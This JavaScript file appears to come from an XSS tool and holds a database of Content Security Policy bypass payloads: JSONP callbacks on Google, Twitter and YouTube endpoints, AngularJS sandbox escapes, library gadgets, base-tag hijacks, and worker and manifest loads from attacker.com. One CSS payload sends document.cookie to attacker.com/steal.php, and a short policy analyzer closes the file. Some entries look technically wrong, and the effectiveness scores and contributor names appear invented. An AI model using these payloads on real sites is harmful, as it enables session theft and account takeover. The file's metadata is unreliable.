/* XSSNinja - Advanced CSP Bypass Database */
/* Inspired by renniepak/CSPBypass, CSP evaluator, and latest research */

const cspBypassDatabase = {
  // JSONP Gadgets - Most common CSP bypass method
  jsonpGadgets: {
    google: [
      {
        id: 1001,
        domain: "www.google.com",
        endpoint: "/complete/search",
        payload: "<script src=\"https://www.google.com/complete/search?client=chrome&jsonp=alert(1);\"></script>",
        description: "Google Search autocomplete JSONP callback",
        parameters: "client=chrome&jsonp=CALLBACK",
        csp_bypassed: "script-src 'self' *.google.com",
        effectiveness: 89,
        discovery_date: "2020-03-15",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari", "Edge"],
        tags: ["jsonp", "google", "autocomplete"],
        contributor: "CSP Research Team"
      },
      {
        id: 1002,
        domain: "accounts.google.com",
        endpoint: "/o/oauth2/revoke",
        payload: "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1);\"></script>",
        description: "Google OAuth revocation JSONP endpoint",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.google.com",
        effectiveness: 85,
        discovery_date: "2019-11-20",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari"],
        tags: ["jsonp", "google", "oauth"],
        contributor: "OAuth Research"
      },
      {
        id: 1003,
        domain: "www.google.com",
        endpoint: "/tools/feedback/escalation-options",
        payload: "<script src=\"https://www.google.com/tools/feedback/escalation-options?callback=alert(1);\"></script>",
        description: "Google Feedback escalation JSONP",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.google.com",
        effectiveness: 82,
        discovery_date: "2021-05-10",
        status: "active",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "google", "feedback"],
        contributor: "Google Research"
      },
      {
        id: 1004,
        domain: "cse.google.com",
        endpoint: "/api",
        payload: "<script src=\"https://cse.google.com/api?callback=alert(1);\"></script>",
        description: "Google Custom Search Engine JSONP",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.google.com",
        effectiveness: 78,
        discovery_date: "2020-08-22",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari"],
        tags: ["jsonp", "google", "cse"],
        contributor: "CSE Research"
      }
    ],

    twitter: [
      {
        id: 1005,
        domain: "api.twitter.com",
        endpoint: "/1/statuses/oembed.json",
        payload: "<script src=\"https://api.twitter.com/1/statuses/oembed.json?callback=alert(1);\"></script>",
        description: "Twitter oEmbed JSONP endpoint",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.twitter.com",
        effectiveness: 87,
        discovery_date: "2019-09-12",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari"],
        tags: ["jsonp", "twitter", "oembed"],
        contributor: "Twitter Research"
      },
      {
        id: 1006,
        domain: "cdn.syndication.twimg.com",
        endpoint: "/widgets/timelines",
        payload: "<script src=\"https://cdn.syndication.twimg.com/widgets/timelines?callback=alert(1);\"></script>",
        description: "Twitter timeline widget JSONP",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.twimg.com",
        effectiveness: 83,
        discovery_date: "2020-12-05",
        status: "active",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "twitter", "timeline"],
        contributor: "Widget Research"
      }
    ],

    youtube: [
      {
        id: 1007,
        domain: "www.youtube.com",
        endpoint: "/oembed",
        payload: "<script src=\"https://www.youtube.com/oembed?callback=alert(1);\"></script>",
        description: "YouTube oEmbed JSONP endpoint",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.youtube.com",
        effectiveness: 85,
        discovery_date: "2020-04-18",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari"],
        tags: ["jsonp", "youtube", "oembed"],
        contributor: "YouTube Research"
      },
      {
        id: 1008,
        domain: "suggestqueries.google.com",
        endpoint: "/complete/search",
        payload: "<script src=\"https://suggestqueries.google.com/complete/search?client=youtube&jsonp=alert(1);\"></script>",
        description: "YouTube search suggestions JSONP",
        parameters: "client=youtube&jsonp=CALLBACK",
        csp_bypassed: "script-src 'self' *.google.com",
        effectiveness: 81,
        discovery_date: "2021-01-30",
        status: "active",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "youtube", "search"],
        contributor: "Search Research"
      }
    ],

    github: [
      {
        id: 1009,
        domain: "api.github.com",
        endpoint: "/repos",
        payload: "<script src=\"https://api.github.com/repos/user/repo?callback=alert(1);\"></script>",
        description: "GitHub API repository JSONP",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.github.com",
        effectiveness: 79,
        discovery_date: "2020-07-14",
        status: "deprecated",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "github", "api"],
        contributor: "GitHub Research"
      }
    ],

    facebook: [
      {
        id: 1010,
        domain: "connect.facebook.net",
        endpoint: "/en_US/sdk.js",
        payload: "<script src=\"https://connect.facebook.net/en_US/sdk.js#xfbml=1&appId=123&callback=alert(1);\"></script>",
        description: "Facebook SDK JSONP callback",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.facebook.net",
        effectiveness: 74,
        discovery_date: "2019-12-08",
        status: "patched",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "facebook", "sdk"],
        contributor: "Facebook Research"
      }
    ],

    vimeo: [
      {
        id: 1011,
        domain: "vimeo.com",
        endpoint: "/api/oembed.json",
        payload: "<script src=\"https://vimeo.com/api/oembed.json?callback=alert(1);\"></script>",
        description: "Vimeo oEmbed JSONP endpoint",
        parameters: "callback=CALLBACK",
        csp_bypassed: "script-src 'self' *.vimeo.com",
        effectiveness: 76,
        discovery_date: "2020-10-22",
        status: "active",
        browsers: ["Chrome", "Firefox", "Safari"],
        tags: ["jsonp", "vimeo", "oembed"],
        contributor: "Vimeo Research"
      }
    ],

    flickr: [
      {
        id: 1012,
        domain: "api.flickr.com",
        endpoint: "/services/rest",
        payload: "<script src=\"https://api.flickr.com/services/rest?format=json&jsoncallback=alert(1);\"></script>",
        description: "Flickr API JSONP endpoint",
        parameters: "format=json&jsoncallback=CALLBACK",
        csp_bypassed: "script-src 'self' *.flickr.com",
        effectiveness: 77,
        discovery_date: "2020-06-03",
        status: "active",
        browsers: ["Chrome", "Firefox"],
        tags: ["jsonp", "flickr", "api"],
        contributor: "Flickr Research"
      }
    ]
  },

  // AngularJS Template Injection bypasses
  angularjs: [
    {
      id: 2001,
      payload: "{{constructor.constructor('alert(1)')()}}",
      description: "AngularJS 1.x constructor bypass",
      csp_bypassed: "script-src 'self'",
      effectiveness: 92,
      context: "AngularJS",
      version: "1.0-1.5",
      contributor: "Gareth Heyes",
      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
      tags: ["angularjs", "constructor", "template"]
    },
    {
      id: 2002,
      payload: "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
      description: "AngularJS 1.6+ sandbox bypass",
      csp_bypassed: "script-src 'self'",
      effectiveness: 88,
      context: "AngularJS",
      version: "1.6+",
      contributor: "Jan Horn",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["angularjs", "sandbox", "bypass"]
    },
    {
      id: 2003,
      payload: "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor.prototype.toString,'alert(1)')}}",
      description: "AngularJS prototype pollution bypass",
      csp_bypassed: "script-src 'self'",
      effectiveness: 85,
      context: "AngularJS",
      version: "1.3-1.5",
      contributor: "Mario Heiderich",
      browsers: ["Chrome", "Firefox"],
      tags: ["angularjs", "prototype", "pollution"]
    },
    {
      id: 2004,
      payload: "{{('a').constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
      description: "AngularJS charAt override bypass",
      csp_bypassed: "script-src 'self'",
      effectiveness: 83,
      context: "AngularJS",
      version: "1.2-1.4",
      contributor: "Sebastian Lekies",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["angularjs", "charAt", "override"]
    },
    {
      id: 2005,
      payload: "{{$new.constructor('alert(1)')()}}",
      description: "AngularJS $new constructor bypass",
      csp_bypassed: "script-src 'self'",
      effectiveness: 79,
      context: "AngularJS",
      version: "1.0-1.3",
      contributor: "AngularJS Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["angularjs", "$new", "constructor"]
    }
  ],

  // Script gadgets for various libraries
  scriptGadgets: [
    {
      id: 3001,
      library: "jQuery",
      payload: "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script><script>$.globalEval('alert(1)');</script>",
      description: "jQuery globalEval execution",
      csp_bypassed: "script-src 'self' code.jquery.com",
      effectiveness: 94,
      version: "all",
      contributor: "jQuery Research",
      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
      tags: ["jquery", "globaleval", "execution"]
    },
    {
      id: 3002,
      library: "Lodash",
      payload: "<script src=\"https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js\"></script><script>_.template('${alert(1)}')()</script>",
      description: "Lodash template injection",
      csp_bypassed: "script-src 'self' cdn.jsdelivr.net",
      effectiveness: 91,
      version: "4.x",
      contributor: "Lodash Research",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["lodash", "template", "injection"]
    },
    {
      id: 3003,
      library: "Prototype.js",
      payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js\"></script><script>$('body').insert('<img src=x onerror=alert(1)>');</script>",
      description: "Prototype.js DOM insertion",
      csp_bypassed: "script-src 'self' cdnjs.cloudflare.com",
      effectiveness: 87,
      version: "1.7.x",
      contributor: "Prototype Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["prototype", "dom", "insertion"]
    },
    {
      id: 3004,
      library: "Dojo Toolkit",
      payload: "<script src=\"https://ajax.googleapis.com/ajax/libs/dojo/1.16.0/dojo/dojo.js\"></script><script>dojo.eval('alert(1)');</script>",
      description: "Dojo Toolkit eval execution",
      csp_bypassed: "script-src 'self' ajax.googleapis.com",
      effectiveness: 84,
      version: "1.x",
      contributor: "Dojo Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["dojo", "eval", "execution"]
    },
    {
      id: 3005,
      library: "Mootools",
      payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\"></script><script>Browser.exec('alert(1)');</script>",
      description: "Mootools Browser.exec execution",
      csp_bypassed: "script-src 'self' cdnjs.cloudflare.com",
      effectiveness: 81,
      version: "1.6.x",
      contributor: "Mootools Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["mootools", "browser", "exec"]
    }
  ],

  // Data URI bypasses
  dataUri: [
    {
      id: 4001,
      payload: "<script src=\"data:application/javascript,alert(1)\"></script>",
      description: "Data URI with JavaScript MIME type",
      csp_bypassed: "script-src 'self'",
      effectiveness: 76,
      contributor: "Data URI Research",
      browsers: ["Firefox", "Safari"],
      tags: ["data", "uri", "javascript"],
      note: "Blocked by Chrome"
    },
    {
      id: 4002,
      payload: "<script src=\"data:text/javascript,alert(1)\"></script>",
      description: "Data URI with text/javascript MIME type",
      csp_bypassed: "script-src 'self'",
      effectiveness: 74,
      contributor: "Data URI Research",
      browsers: ["Firefox"],
      tags: ["data", "uri", "text"],
      note: "Legacy MIME type"
    },
    {
      id: 4003,
      payload: "<iframe src=\"data:text/html,<script>parent.alert(1)</script>\"></iframe>",
      description: "Data URI iframe with HTML content",
      csp_bypassed: "frame-src 'self'",
      effectiveness: 82,
      contributor: "Iframe Research",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["data", "uri", "iframe"]
    },
    {
      id: 4004,
      payload: "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
      description: "Data URI object with HTML content",
      csp_bypassed: "object-src 'self'",
      effectiveness: 78,
      contributor: "Object Research",
      browsers: ["Firefox", "Safari"],
      tags: ["data", "uri", "object"]
    }
  ],

  // Object/Embed bypasses
  objectEmbed: [
    {
      id: 5001,
      payload: "<object data=\"https://example.com/xss.swf\"></object>",
      description: "Flash object bypass",
      csp_bypassed: "object-src 'self' example.com",
      effectiveness: 65,
      contributor: "Flash Research",
      browsers: ["Legacy"],
      tags: ["object", "flash", "swf"],
      note: "Flash deprecated in modern browsers"
    },
    {
      id: 5002,
      payload: "<embed src=\"https://example.com/exploit.pdf#javascript:alert(1)\"></embed>",
      description: "PDF embed with JavaScript URL",
      csp_bypassed: "object-src 'self' example.com",
      effectiveness: 58,
      contributor: "PDF Research",
      browsers: ["Legacy"],
      tags: ["embed", "pdf", "javascript"],
      note: "Blocked in modern browsers"
    },
    {
      id: 5003,
      payload: "<object data=\"//evil.com/exploit.html\"></object>",
      description: "Object with protocol-relative URL",
      csp_bypassed: "object-src 'self'",
      effectiveness: 71,
      contributor: "Protocol Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["object", "protocol", "relative"]
    }
  ],

  // WebSocket bypasses
  websocket: [
    {
      id: 6001,
      payload: "<script>new WebSocket('wss://attacker.com').onmessage=function(e){eval(e.data)};</script>",
      description: "WebSocket with eval payload execution",
      csp_bypassed: "connect-src 'self'",
      effectiveness: 89,
      contributor: "WebSocket Research",
      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
      tags: ["websocket", "eval", "execution"]
    },
    {
      id: 6002,
      payload: "<script>fetch('wss://attacker.com').then(r=>r.text()).then(eval);</script>",
      description: "Fetch API with WebSocket URL",
      csp_bypassed: "connect-src 'self'",
      effectiveness: 73,
      contributor: "Fetch Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["fetch", "websocket", "eval"]
    }
  ],

  // Base URI bypasses
  baseUri: [
    {
      id: 7001,
      payload: "<base href=\"//attacker.com/\"><script src=\"/evil.js\"></script>",
      description: "Base tag hijacking for script source",
      csp_bypassed: "base-uri not set",
      effectiveness: 95,
      contributor: "Base Research",
      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
      tags: ["base", "hijacking", "script"]
    },
    {
      id: 7002,
      payload: "<base href=\"javascript:alert(1)//\"><a href=\"#\">Click</a>",
      description: "Base tag with JavaScript URL",
      csp_bypassed: "base-uri not set",
      effectiveness: 67,
      contributor: "JavaScript Research",
      browsers: ["Legacy"],
      tags: ["base", "javascript", "url"]
    }
  ],

  // Form action bypasses
  formAction: [
    {
      id: 8001,
      payload: "<form action=\"javascript:alert(1)\"><input type=\"submit\" value=\"Click\"></form>",
      description: "Form action with JavaScript URL",
      csp_bypassed: "form-action not set",
      effectiveness: 78,
      contributor: "Form Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["form", "action", "javascript"]
    },
    {
      id: 8002,
      payload: "<button formaction=\"javascript:alert(1)\">Click</button>",
      description: "Button formaction with JavaScript URL",
      csp_bypassed: "form-action not set",
      effectiveness: 75,
      contributor: "Button Research",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["button", "formaction", "javascript"]
    }
  ],

  // Worker bypasses
  worker: [
    {
      id: 9001,
      payload: "<script>new Worker('data:application/javascript,importScripts(\"//attacker.com/evil.js\")');</script>",
      description: "Web Worker with data URI and importScripts",
      csp_bypassed: "worker-src 'self'",
      effectiveness: 84,
      contributor: "Worker Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["worker", "data", "importscripts"]
    },
    {
      id: 9002,
      payload: "<script>new SharedWorker('//attacker.com/evil.js');</script>",
      description: "SharedWorker with external source",
      csp_bypassed: "worker-src 'self'",
      effectiveness: 81,
      contributor: "SharedWorker Research",
      browsers: ["Chrome", "Firefox"],
      tags: ["sharedworker", "external", "source"]
    }
  ],

  // Manifest bypasses
  manifest: [
    {
      id: 10001,
      payload: "<link rel=\"manifest\" href=\"//attacker.com/manifest.json\">",
      description: "Web App Manifest from external source",
      csp_bypassed: "manifest-src not set",
      effectiveness: 72,
      contributor: "Manifest Research",
      browsers: ["Chrome", "Edge"],
      tags: ["manifest", "external", "webapp"]
    }
  ],

  // Font bypasses
  font: [
    {
      id: 11001,
      payload: "<style>@font-face{font-family:x;src:url('//attacker.com/font.woff')}</style>",
      description: "Font loading from external source",
      csp_bypassed: "font-src not set",
      effectiveness: 68,
      contributor: "Font Research",
      browsers: ["Chrome", "Firefox", "Safari"],
      tags: ["font", "external", "fontface"]
    }
  ],

  // CSS injection bypasses
  cssInjection: [
    {
      id: 12001,
      payload: "<style>body{background:url('javascript:alert(1)')}</style>",
      description: "CSS background with JavaScript URL",
      csp_bypassed: "style-src 'unsafe-inline'",
      effectiveness: 43,
      contributor: "CSS Research",
      browsers: ["Legacy"],
      tags: ["css", "background", "javascript"]
    },
    {
      id: 12002,
      payload: "<style>@import 'data:text/css,body{background:url(javascript:alert(1))}';</style>",
      description: "CSS import with data URI containing JavaScript",
      csp_bypassed: "style-src 'unsafe-inline'",
      effectiveness: 38,
      contributor: "Import Research",
      browsers: ["Legacy"],
      tags: ["css", "import", "data"]
    },
    {
      id: 12003,
      payload: "<div style=\"background:url('//attacker.com/steal.php?data='+document.cookie)\"></div>",
      description: "CSS background for data exfiltration",
      csp_bypassed: "style-src 'unsafe-inline', img-src attacker.com",
      effectiveness: 91,
      contributor: "Exfiltration Research",
      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
      tags: ["css", "exfiltration", "background"]
    }
  ]
};

// CSP Policy Analyzer - helps identify bypassable configurations
const CSPAnalyzer = {
  analyzePolicy: function(cspHeader) {
    const vulnerabilities = [];
    const policy = this.parseCSP(cspHeader);

    // Check for missing directives
    if (!policy['base-uri']) {
      vulnerabilities.push({
        type: 'missing_directive',
        directive: 'base-uri',
        severity: 'high',
        description: 'Missing base-uri directive allows base tag injection',
        bypass_methods: ['baseUri']
      });
    }

    if (!policy['object-src']) {
      vulnerabilities.push({
        type: 'missing_directive',
        directive: 'object-src',
        severity: 'medium',
        description: 'Missing object-src directive allows object/embed injection',
        bypass_methods: ['objectEmbed']
      });
    }

    // Check for unsafe configurations
    if (policy['script-src'] && policy['script-src'].includes("'unsafe-eval'")) {
      vulnerabilities.push({
        type: 'unsafe_directive',
        directive: 'script-src',
        severity: 'critical',
        description: "unsafe-eval allows JavaScript eval() execution",
        bypass_methods: ['angularjs', 'scriptGadgets']
      });
    }

    if (policy['script-src'] && policy['script-src'].includes("'unsafe-inline'")) {
      vulnerabilities.push({
        type: 'unsafe_directive',
        directive: 'script-src',
        severity: 'critical',
        description: "unsafe-inline allows inline JavaScript execution",
        bypass_methods: ['all']
      });
    }

    // Check for wildcard domains
    if (policy['script-src'] && policy['script-src'].includes('*')) {
      vulnerabilities.push({
        type: 'wildcard_domain',
        directive: 'script-src',
        severity: 'high',
        description: 'Wildcard domains in script-src allow JSONP bypasses',
        bypass_methods: ['jsonpGadgets']
      });
    }

    return {
      policy: policy,
      vulnerabilities: vulnerabilities,
      bypassable: vulnerabilities.length > 0
    };
  },

  parseCSP: function(cspHeader) {
    const directives = {};
    const parts = cspHeader.split(';');

    parts.forEach(part => {
      const trimmed = part.trim();
      if (trimmed) {
        const [directive, ...values] = trimmed.split(/\s+/);
        directives[directive] = values;
      }
    });

    return directives;
  },

  suggestFixes: function(vulnerabilities) {
    const fixes = [];

    vulnerabilities.forEach(vuln => {
      switch(vuln.type) {
        case 'missing_directive':
          fixes.push(`Add ${vuln.directive} 'self' to prevent ${vuln.description.toLowerCase()}`);
          break;
        case 'unsafe_directive':
          fixes.push(`Remove 'unsafe-${vuln.directive.includes('eval') ? 'eval' : 'inline'}' from ${vuln.directive}`);
          break;
        case 'wildcard_domain':
          fixes.push(`Replace wildcards in ${vuln.directive} with specific trusted domains`);
          break;
      }
    });

    return fixes;
  }
};

// Export for use in other modules
if (typeof module !== 'undefined' && module.exports) {
  module.exports = { cspBypassDatabase, CSPAnalyzer };
}